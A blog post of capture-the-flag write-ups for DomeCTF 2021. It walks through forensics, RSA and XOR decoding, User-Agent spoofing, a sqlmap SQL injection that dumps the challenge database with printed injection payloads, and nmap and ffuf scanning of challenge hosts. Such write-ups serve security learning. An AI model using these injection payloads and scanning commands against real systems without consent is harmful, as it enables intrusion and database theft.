---
title: DomeCTF 2021
author: Vishnu Sudhakaran
date: 2021-11-19 22:57:00 +0530
categories: [CTF-WriteUps]
tags: [ ctf ]
---

![](/assets/img/posts/domectf/DomeCTF.png)

We Secured 7th Position At **DomeCTF** as Part of **c0c0n 2021 Conference**, Conducted by **Kerala Police Cyberdome** And **Beagle Security**. 

# Challenges Writeups

## Brazil - Quick

![](/assets/img/posts/domectf/bra/Brazil.png)

Challenge: [quick_703471b249918e8fc14f95ba119bb7af.zip](https://play.domectf.in/data/attachment.php?id=13)

We can see here 5 QR Codes after extracting the given file. Use any online [QRreader](https://qrscanneronline.com/) to get your flag parts.

![](/assets/img/posts/domectf/bra/1.png)

Combine all parts and submit the flag.

```
domectf{fSFTiyvC9AvkTH2íecvNMTFg3kS6HWWG}  
```
___


## Pakistan - Ambergris

![](/assets/img/posts/domectf/pak/pak.png)

Challenge: [malicious.7z](https://mega.nz/file/QUsU1QZS#9BlLhbaEJSSkqW-H22TcT1VzqozyHTl5kQruse00hXg)

After extrating the file, we can see it's a `filesystem data` using `file` command.

```bash
➜  7z x malicious.7z                               

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_IN,Utf16=on,HugeFiles=on,64 bits,8 CPUs Intel(R) Core(TM) i5-9300H CPU @ 2.40GHz (906EA),ASM,AES-NI)

Scanning the drive for archives:
1 file, 56868345 bytes (55 MiB)

Extracting archive: malicious.7z
--
Path = malicious.7z
Type = 7z
Physical Size = 56868345
Headers Size = 145
Method = LZMA:23
Solid = -
Blocks = 1

Everything is Ok

Size:       314572800
Compressed: 56868345

➜  file malicious                                                                                                                        
malicious: Linux rev 1.0 ext4 filesystem data, UUID=00ed61e1-1230-4818-bffa-305e19e53758 (needs journal recovery) (extents) (64bit) (large files) (huge files) 

```

Choose a `mount point`. and `mount` the file system.

```bash
➜  sudo mkdir -p /mnt/malicious       

➜  sudo mount malicious /mnt/malicious
```

When going through all the files, we can see an interesting archive file called `supersecretcontainer.tar.gz` on `/var/lib/docker/image
` directory. Extract the archive file.

```bash
➜  sudo tar -xvf supersecretcontainer.tar.gz                                                                                                                                                                                       
7176abfdb1534694dc0340677243a324a0416cf2f5e5349242f87a284af3d21d/
7176abfdb1534694dc0340677243a324a0416cf2f5e5349242f87a284af3d21d/VERSION
7176abfdb1534694dc0340677243a324a0416cf2f5e5349242f87a284af3d21d/json
7176abfdb1534694dc0340677243a324a0416cf2f5e5349242f87a284af3d21d/layer.tar
c2bbf02590be7c163c32b7cd885243c802737dec748bda40bc4fe5d3afd1d016.json
d217f9f84361ca13df075de8c820094eca5a952bdb27ca9edfbd711dcc9ed5ae/
d217f9f84361ca13df075de8c820094eca5a952bdb27ca9edfbd711dcc9ed5ae/VERSION
d217f9f84361ca13df075de8c820094eca5a952bdb27ca9edfbd711dcc9ed5ae/json
d217f9f84361ca13df075de8c820094eca5a952bdb27ca9edfbd711dcc9ed5ae/layer.tar
manifest.json

➜  cd 7176abfdb1534694dc0340677243a324a0416cf2f5e5349242f87a284af3d21d; ls    
json  layer.tar  VERSION

```

And get into the first directory called `7176abfdb1534694dc0340677243a324a0416cf2f5e5349242f87a284af3d21d` and there will be an another archive file called `layer.tar`. Extract it and in `/root/.ash_history` there will the flag.

```bash
➜  sudo tar -xvf layer.tar
root/
root/.ash_history

➜  sudo cat root/.ash_history
ls -la
cd root
ls
cd ../\
exit
cd home
ls
cd home
cd ../
ls
cd home
ls
pwd
s
ls
echo domectf{c7nAPFtZRPSwvonJTVVONtI793OxEKYu}
ls
ls -la

```

```
domectf{c7nAPFtZRPSwvonJTVVONtI793OxEKYu}
```
___


## Madagascar - The Cute Beagle

![](/assets/img/posts/domectf/mada/mada.png)

Challenge : [cute_beagle_372a2935c95c17d8a21bf87a5244dc6f.zip](https://play.domectf.in/data/attachment.php?id=4)

In the given file, there is an `secret.txt` that contains cipher text encrypted with `RSA` algorithm, and a picture of a Cute Beagle.

```bash 
➜  cat secret.txt 
n =  8281850967132278399574272688766937486036646313403007679588335903785669628431708760927341727806006769095252325575815709840401878674105658204057327337750902945521512357960818523078486774689928139816732080923197367563639383252762498921096166065153092144335239373370093976823925031794323976150363874930075228846801224430767428594024165529140949082062667410186456029480046489969338885725614510660737026927443934115006027747874368836800022473917576424175601374800697491622086825964475396316066082109998646438504664272000556702241576240616765962934452557847306066736505798267513078073147161755828577875047115978481485076227911405625234425533967247248864837854031634968764570599279385827285321806293661331225163255461894680337693227417748934924109356565823327149859245521513696171473417470936260563397398387972467438182651142096935931112668743912944902147582538985769095457203775208567489073198557073226907349118348902079942096374377432431441166710584381655348979330535397040250376989291669788189409825278457889980676574146044704329826483808929549888234303934178478274711686806257841293265249466735277673158607466360053037971774844824065612178793324128914371112619033111301900922374201703477207948412866443213080633623441392016518823291181

c = 7553952599519757514650115101968852952632457825888625001855418429934419115490882905266945326549436851642489309729477565720592544910214642660523318082160282397451000977681199865455504233402544779560452052341860254252594964025545390908688658630604830781093888327232262187416382053054266892435337677590408483030315477397944352020337351816182538214066074910751820705392399933743688656782991849052752888215258162228567159881795674122623278541751568850766501951705244720482703806961392404219022484905860257184780259868119722626663928994319252730187684597321067739480015362570018930800614161624561619273941783278882977922391010874205768295537255330351411253610730509222243591741176802679884353785309041684947698704947447387482758911352194380979688722291068032208637717416116605429232964038251293407669447328612631867524221830677475348810954818389966117074182770181052445829237462436261410600737121390111874288880285025770530671181565432903245986879191414817645921644507825258172114567799795914132063799352233655660572120141434514035727034044356001099693512670196634137010411122236155349319295976202485129049828008976282635389623975908153735272346355684401082959081182915773654445242977812924717649231020404038985558599818616300812067086475

e = 65537

```

![TheCuteBeagle](/assets/img/posts/domectf/mada/TheCuteBeagle.jpeg)

What is interesting part here when you use `binwalk` on Beagle picture, You can see a compressed `secret.wav` file. Extract it using `-e` switch.

```bash
➜  binwalk -e TheCuteBeagle.jpeg 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
499738        0x7A01A         Zip archive data, encrypted compressed size: 3445919, uncompressed size: 3840404, name: secret.wav
3945811       0x3C3553        End of Zip archive, footer length: 22
 
```

It's a archive file and password protected. We will get that password when we decrypt that `RSA` cipher. Here i used [X-RSA](https://github.com/X-Vector/X-RSA) tool to decrypt.

```bash
➜  python3 /opt/tools/X-RSA/Attack.py

_____       ________________                  _____      _____
\    \     /    /\          \            _____\    \   /      |_
 \    |   |    /  \    /\    \          /    / \    | /         \
  \    \ /    /    |   \_\    |        |    |  /___/||     /\    \
   \    |    /     |      ___/      ____\    \ |   |||    |  |    \
   /    |    \     |      \  ____  /    /\    \|___|/|     \/      \
  /    /|\    \   /     /\ \/    \|    |/ \    \     |\      /\     \
 |____|/ \|____| /_____/ |\______||\____\ /____/|    | \_____\ \_____\
 |    |   |    | |     | | |     || |   ||    | |    | |     | |     |
 |____|   |____| |_____|/ \|_____| \|___||____|/      \|_____|\|_____|
  
[ Version : 0.4 ]
[ Author  : X-Vector ]
[ Github  : github.com/X-Vector ]
[ Twitter : twitter.com/@XVector11 ]
[ Facebook: facebook.com/X.Vector1 ]
[ GreeteZ : Karem Ali ]
    
>>> c = 7553952599519757514650115101968852952632457825888625001855418429934419115490882905266945326549436851642489309729477565720592544910214642660523318082160282397451000977681199865455504233402544779560452052341860254252594964025545390908688658630604830781093888327232262187416382053054266892435337677590408483030315477397944352020337351816182538214066074910751820705392399933743688656782991849052752888215258162228567159881795674122623278541751568850766501951705244720482703806961392404219022484905860257184780259868119722626663928994319252730187684597321067739480015362570018930800614161624561619273941783278882977922391010874205768295537255330351411253610730509222243591741176802679884353785309041684947698704947447387482758911352194380979688722291068032208637717416116605429232964038251293407669447328612631867524221830677475348810954818389966117074182770181052445829237462436261410600737121390111874288880285025770530671181565432903245986879191414817645921644507825258172114567799795914132063799352233655660572120141434514035727034044356001099693512670196634137010411122236155349319295976202485129049828008976282635389623975908153735272346355684401082959081182915773654445242977812924717649231020404038985558599818616300812067086475
>>> n = 8281850967132278399574272688766937486036646313403007679588335903785669628431708760927341727806006769095252325575815709840401878674105658204057327337750902945521512357960818523078486774689928139816732080923197367563639383252762498921096166065153092144335239373370093976823925031794323976150363874930075228846801224430767428594024165529140949082062667410186456029480046489969338885725614510660737026927443934115006027747874368836800022473917576424175601374800697491622086825964475396316066082109998646438504664272000556702241576240616765962934452557847306066736505798267513078073147161755828577875047115978481485076227911405625234425533967247248864837854031634968764570599279385827285321806293661331225163255461894680337693227417748934924109356565823327149859245521513696171473417470936260563397398387972467438182651142096935931112668743912944902147582538985769095457203775208567489073198557073226907349118348902079942096374377432431441166710584381655348979330535397040250376989291669788189409825278457889980676574146044704329826483808929549888234303934178478274711686806257841293265249466735277673158607466360053037971774844824065612178793324128914371112619033111301900922374201703477207948412866443213080633623441392016518823291181
>>> e = 65537

PlainText in Decimal : 1797147753856124285537
PlainText in hex : 616c6f686f6d6f7261
PlainText in ascii : alohomora
```
We got the password it is `alohomora`, Now extract the archive file.

```bash
➜  7z x 7A01A.zip   

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_IN,Utf16=on,HugeFiles=on,64 bits,8 CPUs Intel(R) Core(TM) i5-9300H CPU @ 2.40GHz (906EA),ASM,AES-NI)

Scanning the drive for archives:
1 file, 3446095 bytes (3366 KiB)

Extracting archive: 7A01A.zip
--
Path = 7A01A.zip
Type = zip
Physical Size = 3446095

    
Would you like to replace the existing file:
  Path:     ./secret.wav
  Size:     0 bytes
  Modified: 2021-11-10 15:57:38
with the file from archive:
  Path:     secret.wav
  Size:     3840404 bytes (3751 KiB)
  Modified: 2021-11-10 15:57:38
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? y

                 
Enter password (will not be echoed):
Everything is Ok 

Size:       3840404
Compressed: 3446095

```

Play that file and it's a Cricket commentary, after 10 sec there is something suspicious we can hear that. Open it with `Audacity` and use `Spectrogram`.

![](/assets/img/posts/domectf/mada/1.png)

```
171f0806170609491645375a122b3f4a16320d2d213f167940010236321f2a683e282012230a3e600e
```

It's a `Hex` String encoded with `XOR`. Decode it using [CyberChef](https://gchq.github.io/CyberChef/), We all know `XOR` need a key to decode, So here i take `domectf{` as key then in the result we can see word `spectro2` and some characters.

![](/assets/img/posts/domectf/mada/2.png)

`spectro2` is the right key to get the flag.

![](/assets/img/posts/domectf/mada/3.png)

```
domectf{e5R9fYPxeBhNUMyK3qgUFmEZMXEqWxQR}
```
___


## Mexico - whoami

![](/assets/img/posts/domectf/mex/Mex.png)

Challenge: [https://whoami.2021.domectf.in/](https://whoami.2021.domectf.in/)

In the webpage we see some `User-Agent` information.

![](/assets/img/posts/domectf/mex/1.png)

The challenge is something about `User-Agent`, what is the interesting part here we can see at bottom `Powered by : Yandex`, So i choose `Yandex Browser` as a User-Agent with `User-Agent Switcher` extention, Just refresh the page you will get your flag at bottom.

![](/assets/img/posts/domectf/mex/2.png)

```
domectf{yazxBEsZbtP7d8cecSJWyXRRmdM5msLB}
```
___


## United States - brut

![](/assets/img/posts/domectf/us/us.png)

Challenge: [https://brut.2021.domectf.in/](https://brut.2021.domectf.in/)

![](/assets/img/posts/domectf/us/1.png)

The Login page is vulnerable for `sql injection`. Here i used [sqlmap](https://sqlmap.org/) to automate the process. 

```bash
➜  sqlmap "https://brut.2021.domectf.in/" --forms --dump-all --batch
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.5.10#stable}
|_ -| . [)]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:27:59 /2021-11-19/

[21:28:00] [INFO] testing connection to the target URL
[21:28:01] [INFO] searching for forms
[1/1] Form:
POST https://brut.2021.domectf.in/web/login.php
POST data: username=&password=
do you want to test this form? [Y/n/q] 
> Y
Edit POST data [default: username=&password=] (Warning: blank fields detected): username=&password=
do you want to fill blank fields with random values? [Y/n] Y
[21:28:03] [INFO] using '/home/an0n4ce/.local/share/sqlmap/output/results-11192021_0928pm.csv' as the CSV results file in multiple targets mode
[21:28:05] [INFO] checking if the target is protected by some kind of WAF/IPS
[21:28:06] [INFO] testing if the target URL content is stable
[21:28:07] [INFO] target URL content is stable
[21:28:07] [INFO] testing if POST parameter 'username' is dynamic
[21:28:08] [WARNING] POST parameter 'username' does not appear to be dynamic
[21:28:09] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[21:28:10] [INFO] testing for SQL injection on POST parameter 'username'
[21:28:10] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[21:28:20] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[21:28:21] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[21:28:27] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[21:28:31] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[21:28:36] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[21:28:41] [INFO] testing 'Generic inline queries'
[21:28:42] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[21:28:46] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[21:28:51] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[21:28:56] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[21:29:10] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[21:29:10] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[21:29:10] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[21:29:13] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[21:29:18] [INFO] target URL appears to have 2 columns in query
[21:29:22] [INFO] POST parameter 'username' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 59 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=hmxg' AND (SELECT 1049 FROM (SELECT(SLEEP(5)))OyUh) AND 'fLND'='fLND&password=

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: username=hmxg' UNION ALL SELECT CONCAT(0x71707a6271,0x79666b61545554474a6f6c6f76467278506c6961615a6179625a74445a6a445868794e4e70596a64,0x71707a7871),NULL-- -&password=
---
do you want to exploit this SQL injection? [Y/n] Y
[21:29:22] [INFO] the back-end DBMS is MySQL


[21:29:35] [INFO] table 'SqliDB.sqladminuser' dumped to CSV file '/home/an0n4ce/.local/share/sqlmap/output/brut.2021.domectf.in/dump/SqliDB/sqladminuser.csv'
[21:29:35] [INFO] fetching columns for table 'flag' in database 'flag'
[21:29:36] [INFO] fetching entries for table 'flag' in database 'flag'
Database: flag
Table: flag
[1 entry]
+----+-------------------------------------------+
| id | flag                                      |
+----+-------------------------------------------+
| 1  | domectf{kvKBs5kmReB5yqHg7nwNcvd9mCN6tHNb} |
+----+-------------------------------------------+


```

```
domectf{kvKBs5kmReB5yqHg7nwNcvd9mCN6tHNb}
```
___


## Greenland - Travel

![](/assets/img/posts/domectf/green/greenland.png)

Challenge: [https://travel.2021.domectf.in/](https://travel.2021.domectf.in/)

Here we can see a nice themed webpage, and noting got from there :(

![](/assets/img/posts/domectf/green/1.png)

when i scan all ports with `nmap` on webserver there is an interesting port `8080`.
```bash
➜  nmap -p- travel.2021.domectf.in --min-rate 10000                               
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-19 21:50 IST
Nmap scan report for travel.2021.domectf.in (169.45.75.5)
Host is up (0.32s latency).
rDNS record for 169.45.75.5: 5.4b.2da9.ip4.static.sl-reverse.com
Not shown: 65531 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
8080/tcp open  http-proxy
```
![](/assets/img/posts/domectf/green/2.png)

It gives out `Admin Backend`, So let's start FUZZing.

```bash
➜  ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://travel.2021.domectf.in:8080/FUZZ -t 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : https://travel.2021.domectf.in:8080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

# or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 13, Words: 2, Lines: 1]

# Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 13, Words: 2, Lines: 1]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 13, Words: 2, Lines: 1]
admin                   [Status: 200, Size: 91, Words: 2, Lines: 8]
[WARN] Caught keyboard interrupt (Ctrl-C)

```

We can see `base64` encoded flag on `/admin` directory.

![](/assets/img/posts/domectf/green/3.png)

Decode to get your flag.

```bash
➜  echo 'ZG9tZWN0Zntka3kzQWxreWZjaW5rRjZNWWxWcEFzOU9zWDlab0FXV30=' | base64 -d                                                                                
domectf{dky3AlkyfcinkF6MYlVpAs9OsX9ZoAWW} 
```
```
domectf{dky3AlkyfcinkF6MYlVpAs9OsX9ZoAWW}
```

## Happy Hacking!


